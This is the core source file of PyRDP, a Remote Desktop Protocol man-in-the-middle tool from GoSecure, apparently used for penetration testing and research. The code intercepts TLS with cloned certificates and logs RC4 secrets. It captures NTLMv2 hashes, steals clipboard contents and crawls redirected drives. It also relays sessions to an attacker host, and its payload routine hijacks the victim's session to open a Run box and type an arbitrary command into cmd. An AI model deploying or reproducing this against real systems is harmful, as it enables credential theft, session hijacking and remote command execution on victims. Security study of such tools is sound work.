#
# This file is part of the PyRDP project.
# Copyright (C) 2019-2021 GoSecure Inc.
# Licensed under the GPLv3 or later.
#

import asyncio
import datetime
import typing

from twisted.internet import reactor
from twisted.internet.protocol import Protocol

from pyrdp.core import AsyncIOSequencer, AwaitableClientFactory, connectTransparent
from pyrdp.core.ssl import ClientTLSContext, ServerTLSContext, CertificateCache
from pyrdp.enum import MCSChannelName, ParserMode, PlayerPDUType, ScanCode, SegmentationPDUType
from pyrdp.layer import ClipboardLayer, DeviceRedirectionLayer, LayerChainItem, RawLayer, \
    VirtualChannelLayer
from pyrdp.layer.rdp.virtual_channel.dynamic_channel import DynamicChannelLayer
from pyrdp.layer.segmentation import SegmentationObserver
from pyrdp.logging import RC4LoggingObserver
from pyrdp.logging.StatCounter import StatCounter
from pyrdp.logging.adapters import SessionLogger
from pyrdp.logging.observers import FastPathLogger, LayerLogger, MCSLogger, SecurityLogger, \
    SlowPathLogger, X224Logger
from pyrdp.mcs import MCSClientChannel, MCSServerChannel
from pyrdp.mitm.AttackerMITM import AttackerMITM
from pyrdp.mitm.ClipboardMITM import ActiveClipboardStealer, PassiveClipboardStealer
from pyrdp.mitm.DeviceRedirectionMITM import DeviceRedirectionMITM
from pyrdp.mitm.DynamicChannelMITM import DynamicChannelMITM
from pyrdp.mitm.FastPathMITM import FastPathMITM
from pyrdp.mitm.FileCrawlerMITM import FileCrawlerMITM
from pyrdp.mitm.MCSMITM import MCSMITM
from pyrdp.mitm.MITMRecorder import MITMRecorder
from pyrdp.mitm.PlayerLayerSet import TwistedPlayerLayerSet
from pyrdp.mitm.SecurityMITM import SecurityMITM
from pyrdp.mitm.SlowPathMITM import SlowPathMITM
from pyrdp.mitm.TCPMITM import TCPMITM
from pyrdp.mitm.VirtualChannelMITM import VirtualChannelMITM
from pyrdp.mitm.X224MITM import X224MITM
from pyrdp.mitm.config import MITMConfig
from pyrdp.mitm.layerset import RDPLayerSet
from pyrdp.mitm.state import RDPMITMState
from pyrdp.parser.rdp.virtual_channel.dynamic_channel import DynamicChannelParser
from pyrdp.recording import FileLayer, RecordingFastPathObserver, RecordingSlowPathObserver, \
    Recorder
from pyrdp.security import NTLMSSPState
from pyrdp.security.nla import NLAHandler


class RDPMITM:
    """
    Main MITM class. The job of this class is to orchestrate the components for all the protocols.
    """

    def __init__(self, mainLogger: SessionLogger, crawlerLogger: SessionLogger, config: MITMConfig, state: RDPMITMState = None, recorder: Recorder = None):
        """
        :param mainLogger: base logger to use for the connection
        :param config: the MITM configuration
        """

        self.log = mainLogger
        """Base logger for the connection"""

        self.clientLog = mainLogger.createChild("client")
        """Base logger for the client side"""

        self.serverLog = mainLogger.createChild("server")
        """Base logger for the server side"""

        self.attackerLog = mainLogger.createChild("attacker")
        """Base logger for the attacker side"""

        self.rc4Log = mainLogger.createChild("rc4")
        """Logger for RC4 secrets"""

        self.config = config
        """The MITM configuration"""

        self.statCounter = StatCounter()
        """Class to keep track of connection-related statistics such as # of mouse events, # of output events, etc."""

        self.state = state if state is not None else RDPMITMState(self.config, self.log.sessionID)
        """The MITM state"""

        self.client = RDPLayerSet()
        """Layers on the client side"""

        self.server = RDPLayerSet()
        """Layers on the server side"""

        self.player = TwistedPlayerLayerSet()
        """Layers on the attacker side"""

        self.recorder = recorder if recorder is not None else MITMRecorder([], self.state)
        """Recorder for this connection"""

        self.channelMITMs = {}
        """MITM components for virtual channels"""

        self.onTlsReady = None
        """Callback for when TLS is done"""

        self.tcp = TCPMITM(self.client.tcp, self.server.tcp, self.player.tcp, self.getLog("tcp"), self.state, self.recorder, self.statCounter)
        """TCP MITM component"""

        self.x224 = X224MITM(self.client.x224, self.server.x224, self.getLog("x224"), self.state, self.connectToServer, self.disconnectFromServer, self.startTLS)
        """X224 MITM component"""

        self.mcs = MCSMITM(self.client.mcs, self.server.mcs, self.state, self.recorder, self.buildChannel, self.getLog("mcs"), self.statCounter)
        """MCS MITM component"""

        self.security: SecurityMITM = None
        """Security MITM component"""

        self.slowPath = SlowPathMITM(self.client.slowPath, self.server.slowPath, self.state, self.statCounter, self.getLog("slowpath"))
        """Slow-path MITM component"""

        self.fastPath: FastPathMITM = None
        """Fast-path MITM component"""

        self.attacker: AttackerMITM = None

        self.crawler: FileCrawlerMITM = None

        self.client.x224.addObserver(X224Logger(self.getClientLog("x224")))
        self.client.mcs.addObserver(MCSLogger(self.getClientLog("mcs")))
        self.client.slowPath.addObserver(SlowPathLogger(self.getClientLog("slowpath")))
        self.client.slowPath.addObserver(RecordingSlowPathObserver(self.recorder))

        self.server.x224.addObserver(X224Logger(self.getServerLog("x224")))
        self.server.mcs.addObserver(MCSLogger(self.getServerLog("mcs")))
        self.server.slowPath.addObserver(SlowPathLogger(self.getServerLog("slowpath")))
        self.server.slowPath.addObserver(RecordingSlowPathObserver(self.recorder))

        self.player.player.addObserver(LayerLogger(self.attackerLog))

        self.ensureOutDir()

        if config.certificateFileName is None:
            self.certs: CertificateCache = CertificateCache(self.config.certDir, mainLogger.createChild("cert"))
        else:
            self.certs = None

        self.state.securitySettings.addObserver(RC4LoggingObserver(self.rc4Log))

        if config.recordReplays:
            date = datetime.datetime.now()
            replayFileName = f"rdp_replay_{date.strftime('%Y%m%d_%H-%M-%S')}_{date.microsecond // 1000}_{self.state.sessionID}.pyrdp"
            self.recorder.setRecordFilename(replayFileName)
            self.recorder.addTransport(FileLayer(self.config.replayDir / replayFileName))

        if config.enableCrawler:
            self.crawler: FileCrawlerMITM = FileCrawlerMITM(
                self.getClientLog(MCSChannelName.DEVICE_REDIRECTION).createChild("crawler"),
                crawlerLogger,
                self.config,
                self.state
            )

    def getProtocol(self) -> Protocol:
        """
        Get the Protocol expected by Twisted.
        """
        return self.client.tcp

    def getLog(self, name: str) -> SessionLogger:
        """
        Get a sub-logger from the base logger
        :param name: name of the sub-logger
        """
        return self.log.createChild(name)

    def getClientLog(self, name: str) -> SessionLogger:
        """
        Get a sub-logger from the client logger
        :param name: name of the sub-logger
        """
        return self.clientLog.createChild(name)

    def getServerLog(self, name: str) -> SessionLogger:
        """
        Get a sub-logger from the server logger
        :param name: name of the sub-logger
        """
        return self.serverLog.createChild(name)

    def disconnectFromServer(self):
        self.server.replaceTCP()
        self.tcp.setServer(self.server.tcp)

    async def connectToServer(self):
        """
        Coroutine that connects to the target RDP server and the attacker.
        Connection to the attacker side has a 1 second timeout to avoid hanging the connection.
        """
        self.addClientIpToLoggers(self.state.clientIp)

        serverFactory = AwaitableClientFactory(self.server.tcp)
        if self.config.transparent:
            if self.state.effectiveTargetHost:
                # Fully Transparent (with a specific poisoned target, or when using redirection)
                src = self.client.tcp.transport.client
                connectTransparent(self.state.effectiveTargetHost, self.state.effectiveTargetPort, serverFactory, bindAddress=(src[0], 0))
            else:
                # Half Transparent (for client-side only)
                dst = self.client.tcp.transport.getHost().host
                reactor.connectTCP(dst, self.state.effectiveTargetPort, serverFactory)
        else:
            reactor.connectTCP(self.state.effectiveTargetHost, self.state.effectiveTargetPort, serverFactory)

        await serverFactory.connected.wait()

        if self.config.attackerHost is not None and self.config.attackerPort is not None and not self.player.tcp.connectedEvent.is_set():
            attackerFactory = AwaitableClientFactory(self.player.tcp)
            reactor.connectTCP(self.config.attackerHost, self.config.attackerPort, attackerFactory)

            try:
                await asyncio.wait_for(attackerFactory.connected.wait(), 1.0)
                self.recorder.addTransport(self.player.tcp)
            except asyncio.TimeoutError:
                self.log.error("Failed to connect to recording host: timeout expired")

    def doClientTls(self):
        cert = self.server.tcp.transport.getPeerCertificate()
        if not cert:
            # Wait for server certificate
            reactor.callLater(1, self.doClientTls)

        # Clone certificate if necessary.
        if self.certs:
            privKey, certFile = self.certs.lookup(cert)
            contextForClient = ServerTLSContext(privKey, certFile)
        else:
            # No automated certificate cloning. Use the specified certificate.
            contextForClient = ServerTLSContext(self.config.privateKeyFileName, self.config.certificateFileName)

        # Establish TLS tunnel with the client
        self.onTlsReady()
        self.client.tcp.startTLS(contextForClient)
        self.onTlsReady = None

        # Handle NLA connection for client/server
        ntlmSSPState = NTLMSSPState()
        if self.state.ntlmCapture:
            # We are capturing the NLA NTLMv2 hash
            self.client.segmentation.addObserver(NLAHandler(self.client.tcp, ntlmSSPState, self.getLog("ntlmssp"), ntlmCapture=True))
            return

        self.client.segmentation.addObserver(NLAHandler(self.server.tcp, ntlmSSPState, self.getLog("ntlmssp")))
        self.server.segmentation.addObserver(NLAHandler(self.client.tcp, ntlmSSPState, self.getLog("ntlmssp")))

    def startTLS(self, onTlsReady: typing.Callable[[], None]):
        """
        Execute a startTLS on both the client and server side.
        """
        self.onTlsReady = onTlsReady

        # Establish TLS tunnel with target server...
        contextForServer = ClientTLSContext()
        self.server.tcp.startTLS(contextForServer)

        # Establish TLS tunnel with client.
        reactor.callLater(1, self.doClientTls)

    def buildChannel(self, client: MCSServerChannel, server: MCSClientChannel):
        """
        Build a MITM component for an MCS channel. The client side has an MCSServerChannel because from the point of view
        of the MITM, the client channel is on a server socket and vice-versa.
        :param client: MCS channel for the client side
        :param server: MCS channel for the server side
        """

        channelID = client.channelID

        if channelID not in self.state.channelMap:
            self.buildVirtualChannel(client, server)
            return

        if self.state.channelMap[channelID] == MCSChannelName.IO:
            self.buildIOChannel(client, server)
        elif self.state.channelMap[channelID] == MCSChannelName.CLIPBOARD:
            self.buildClipboardChannel(client, server)
        elif self.state.channelMap[channelID] == MCSChannelName.DEVICE_REDIRECTION:
            self.buildDeviceChannel(client, server)
        elif self.state.channelMap[channelID] == MCSChannelName.DYNAMIC_CHANNEL:
            self.buildDynamicChannel(client, server)
        else:
            self.buildVirtualChannel(client, server)

    def buildIOChannel(self, client: MCSServerChannel, server: MCSClientChannel):
        """
        Build the MITM component for input and output.
        :param client: MCS channel for the client side
        :param server: MCS channel for the server side
        """

        self.client.security = self.state.createSecurityLayer(ParserMode.SERVER, False)
        self.client.fastPath = self.state.createFastPathLayer(ParserMode.SERVER)
        self.server.security = self.state.createSecurityLayer(ParserMode.CLIENT, False)
        self.server.fastPath = self.state.createFastPathLayer(ParserMode.CLIENT)

        self.client.security.addObserver(SecurityLogger(self.getClientLog("security")))
        self.client.fastPath.addObserver(FastPathLogger(self.getClientLog("fastpath")))
        self.client.fastPath.addObserver(RecordingFastPathObserver(self.recorder, PlayerPDUType.FAST_PATH_INPUT))

        self.server.security.addObserver(SecurityLogger(self.getServerLog("security")))
        self.server.fastPath.addObserver(FastPathLogger(self.getServerLog("fastpath")))
        self.server.fastPath.addObserver(RecordingFastPathObserver(self.recorder, PlayerPDUType.FAST_PATH_OUTPUT))

        self.security = SecurityMITM(self.client.security, self.server.security, self.getLog("security"), self.config, self.state, self.recorder)
        self.fastPath = FastPathMITM(self.client.fastPath, self.server.fastPath, self.state, self.statCounter, self.getLog("fastpath"))

        if self.player.tcp.transport or self.config.payload:
            self.attacker = AttackerMITM(self.client.fastPath, self.server.fastPath, self.player.player, self.log, self.state, self.recorder)

            if MCSChannelName.DEVICE_REDIRECTION in self.state.channelMap:
                deviceRedirectionChannel = self.state.channelMap[MCSChannelName.DEVICE_REDIRECTION]

                if deviceRedirectionChannel in self.channelMITMs:
                    deviceRedirection: DeviceRedirectionMITM = self.channelMITMs[deviceRedirectionChannel]
                    self.attacker.setDeviceRedirectionComponent(deviceRedirection)

        LayerChainItem.chain(client, self.client.security, self.client.slowPath)
        LayerChainItem.chain(server, self.server.security, self.server.slowPath)

        self.client.segmentation.attachLayer(SegmentationPDUType.FAST_PATH, self.client.fastPath)
        self.server.segmentation.attachLayer(SegmentationPDUType.FAST_PATH, self.server.fastPath)

        self.sendPayload()

    def buildClipboardChannel(self, client: MCSServerChannel, server: MCSClientChannel):
        """
        Build the MITM component for the clipboard channel.
        :param client: MCS channel for the client side
        :param server: MCS channel for the server side
        """

        clientSecurity = self.state.createSecurityLayer(ParserMode.SERVER, True)
        clientVirtualChannel = VirtualChannelLayer()
        clientLayer = ClipboardLayer()
        serverSecurity = self.state.createSecurityLayer(ParserMode.CLIENT, True)
        serverVirtualChannel = VirtualChannelLayer()
        serverLayer = ClipboardLayer()

        clientLayer.addObserver(LayerLogger(self.getClientLog(MCSChannelName.CLIPBOARD)))
        serverLayer.addObserver(LayerLogger(self.getServerLog(MCSChannelName.CLIPBOARD)))

        LayerChainItem.chain(client, clientSecurity, clientVirtualChannel, clientLayer)
        LayerChainItem.chain(server, serverSecurity, serverVirtualChannel, serverLayer)

        if self.config.disableActiveClipboardStealing:
            mitm = PassiveClipboardStealer(self.config, clientLayer, serverLayer, self.getLog(MCSChannelName.CLIPBOARD),
                                           self.recorder, self.statCounter, self.state)
        else:
            mitm = ActiveClipboardStealer(self.config, clientLayer, serverLayer, self.getLog(MCSChannelName.CLIPBOARD),
                                          self.recorder, self.statCounter, self.state)
        self.channelMITMs[client.channelID] = mitm

    def buildDeviceChannel(self, client: MCSServerChannel, server: MCSClientChannel):
        """
        Build the MITM component for the device redirection channel.
        :param client: MCS channel for the client side
        :param server: MCS channel for the server side
        """

        clientSecurity = self.state.createSecurityLayer(ParserMode.SERVER, True)
        clientVirtualChannel = VirtualChannelLayer(activateShowProtocolFlag=False)
        clientLayer = DeviceRedirectionLayer()
        serverSecurity = self.state.createSecurityLayer(ParserMode.CLIENT, True)
        serverVirtualChannel = VirtualChannelLayer(activateShowProtocolFlag=False)
        serverLayer = DeviceRedirectionLayer()

        clientLayer.addObserver(LayerLogger(self.getClientLog(MCSChannelName.DEVICE_REDIRECTION)))
        serverLayer.addObserver(LayerLogger(self.getServerLog(MCSChannelName.DEVICE_REDIRECTION)))

        LayerChainItem.chain(client, clientSecurity, clientVirtualChannel, clientLayer)
        LayerChainItem.chain(server, serverSecurity, serverVirtualChannel, serverLayer)

        deviceRedirection = DeviceRedirectionMITM(clientLayer, serverLayer,
                                                  self.getLog(MCSChannelName.DEVICE_REDIRECTION),
                                                  self.statCounter, self.state, self.tcp)
        self.channelMITMs[client.channelID] = deviceRedirection

        if self.config.enableCrawler:
            self.crawler.setDeviceRedirectionComponent(deviceRedirection)

        if self.attacker:
            self.attacker.setDeviceRedirectionComponent(deviceRedirection)

    def buildDynamicChannel(self, client: MCSServerChannel, server: MCSClientChannel):
        """
        Build the MITM component for the dynamic channel.
        Ref: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpedyc/0147004d-1542-43ab-9337-93338f218587
        :param client: MCS channel for the client side
        :param server: MCS channel for the server side
        """

        clientSecurity = self.state.createSecurityLayer(ParserMode.SERVER, True)
        clientVirtualChannel = VirtualChannelLayer(activateShowProtocolFlag=False)
        clientLayer = DynamicChannelLayer(DynamicChannelParser(isClient=True))
        serverSecurity = self.state.createSecurityLayer(ParserMode.CLIENT, True)
        serverVirtualChannel = VirtualChannelLayer(activateShowProtocolFlag=False)
        serverLayer = DynamicChannelLayer(DynamicChannelParser(isClient=False))

        clientLayer.addObserver(LayerLogger(self.getClientLog(MCSChannelName.DYNAMIC_CHANNEL)))
        serverLayer.addObserver(LayerLogger(self.getServerLog(MCSChannelName.DYNAMIC_CHANNEL)))

        LayerChainItem.chain(client, clientSecurity, clientVirtualChannel, clientLayer)
        LayerChainItem.chain(server, serverSecurity, serverVirtualChannel, serverLayer)

        dynamicChannelMITM = DynamicChannelMITM(clientLayer, serverLayer, self.getLog(MCSChannelName.DYNAMIC_CHANNEL), self.statCounter, self.state)
        self.channelMITMs[client.channelID] = dynamicChannelMITM

    def buildVirtualChannel(self, client: MCSServerChannel, server: MCSClientChannel):
        """
        Build a generic MITM component for any virtual channel.
        :param client: MCS channel for the client side
        :param server: MCS channel for the server side
        """

        clientSecurity = self.state.createSecurityLayer(ParserMode.SERVER, True)
        clientLayer = RawLayer()
        serverSecurity = self.state.createSecurityLayer(ParserMode.CLIENT, True)
        serverLayer = RawLayer()

        LayerChainItem.chain(client, clientSecurity, clientLayer)
        LayerChainItem.chain(server, serverSecurity, serverLayer)

        mitm = VirtualChannelMITM(clientLayer, serverLayer, self.statCounter)
        self.channelMITMs[client.channelID] = mitm

    def sendPayload(self):
        if len(self.config.payload) == 0:
            return

        if self.config.payloadDelay is None:
            self.log.error("Payload was set but no delay is configured. Please configure a payload delay. Payload will not be sent for this connection.")
            return

        if self.config.payloadDuration is None:
            self.log.error("Payload was set but no duration is configured. Please configure a payload duration. Payload will not be sent for this connection.")
            return

        def waitForDelay() -> int:
            return self.config.payloadDelay

        def disableForwarding() -> int:
            self.state.forwardInput = False
            self.state.forwardOutput = False
            return 200

        def openRunWindow() -> int:
            self.attacker.sendKeys([ScanCode.LWIN, ScanCode.KEY_R])
            return 200

        def sendCMD() -> int:
            self.attacker.sendText("cmd")
            return 200

        def sendEnterKey() -> int:
            self.attacker.sendKeys([ScanCode.RETURN])
            return 200

        def sendPayload() -> int:
            return self.attacker.sendText(self.config.payload + " & exit")

        def waitForPayload() -> int:
            return self.config.payloadDuration

        def enableForwarding():
            self.state.forwardInput = True
            self.state.forwardOutput = True

        payload = sendPayload()
        sequencer = AsyncIOSequencer([
            waitForDelay,
            disableForwarding,
            openRunWindow,
            sendCMD,
            sendEnterKey,
            *payload,
            sendEnterKey,
            waitForPayload,
            enableForwarding
        ])
        sequencer.run()

    def ensureOutDir(self):
        self.config.outDir.mkdir(parents=True, exist_ok=True)
        self.config.replayDir.mkdir(exist_ok=True)
        self.config.fileDir.mkdir(exist_ok=True)
        self.config.certDir.mkdir(exist_ok=True)

    def addClientIpToLoggers(self, clientIp: str):
        """
        Add the client IP address to all relevant loggers.
        """
        self.log.extra['clientIp'] = self.state.clientIp
        self.clientLog.extra['clientIp'] = self.state.clientIp
        self.serverLog.extra['clientIp'] = self.state.clientIp
        self.attackerLog.extra['clientIp'] = self.state.clientIp
        self.rc4Log.extra['clientIp'] = self.state.clientIp

        self.x224.log.extra['clientIp'] = self.state.clientIp
        self.mcs.log.extra['clientIp'] = self.state.clientIp
        self.slowPath.log.extra['clientIp'] = self.state.clientIp

        if self.certs:
            self.certs.log.extra['clientIp'] = self.state.clientIp
